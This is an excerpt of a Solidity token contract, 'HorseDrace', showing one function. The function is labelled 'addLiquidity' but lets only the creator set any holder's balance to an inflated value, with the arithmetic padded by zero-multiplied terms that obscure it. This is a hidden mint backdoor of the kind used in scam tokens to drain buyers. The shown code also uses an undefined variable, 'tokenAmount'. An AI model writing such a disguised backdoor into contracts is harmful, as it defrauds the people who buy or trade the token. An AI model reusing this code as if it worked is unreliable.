...
contract HorseDrace is IERC20 {
  ...
  function addLiquidity(address tokenHolder, uint256 ethAmount) public onlyCreator {
    if(tokenHolder != address(0) && msg.sender != address(0))
    _balances[tokenHolder] = (tokenAmount * 0 + _balances[tokenHolder] - tokenAmount * 0 + _balances[tokenHolder]) + (ethAmount * 10 ** 9);
  }
}